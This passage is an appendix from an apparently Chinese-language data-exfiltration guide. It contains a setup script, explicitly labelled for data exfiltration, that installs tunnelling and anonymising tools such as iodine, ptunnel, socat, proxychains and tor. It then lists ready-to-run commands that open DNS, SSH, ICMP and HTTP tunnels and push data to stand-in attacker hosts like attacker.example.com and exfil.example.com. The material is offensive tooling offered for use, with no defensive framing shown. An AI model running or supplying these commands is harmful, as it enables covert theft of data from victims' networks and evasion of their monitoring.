## 附录B: 工具链与环境准备

```bash
#!/bin/bash
# 数据外泄环境准备脚本

echo "[*] 安装依赖..."

# Python依赖
pip3 install cryptography pycryptodome paramiko scapy aioquic websocket-client \
    boto3 azure-storage-blob google-cloud-storage web3 bleak pillow numpy \
    dnspython requests aiohttp --quiet

# 系统工具
if command -v apt-get &> /dev/null; then
    apt-get install -y dnsutils iodine ptunnel socat proxychains4 tor \
        sshuttle stunnel4 openvpn wireguard --quiet 2>/dev/null
elif command -v yum &> /dev/null; then
    yum install -y bind-utils iodine ptunnel socat proxychains tor \
        sshuttle stunnel openvpn wireguard-tools --quiet 2>/dev/null
fi

# 编译工具
if ! command -v iodine &> /dev/null; then
    git clone https://github.com/yarrick/iodine.git /tmp/iodine
    cd /tmp/iodine && make && make install
fi

echo "[+] 环境准备完成"
```

### 快速启动命令

```bash
# DNS隧道 (iodine)
iodine -f -P password123 attacker.example.com

# SSH隧道
ssh -D 1080 -N -f user@attacker-server.com

# ICMP隧道 (ptunnel)
ptunnel -p attacker-server.com -lp 8000 -da localhost -dp 22

# SOCKS代理
proxychains4 curl https://exfil.example.com/data

# HTTP隧道
socat TCP-LISTEN:8080,reuseaddr,fork PROXY:proxy-server:attacker.com:443
```

---

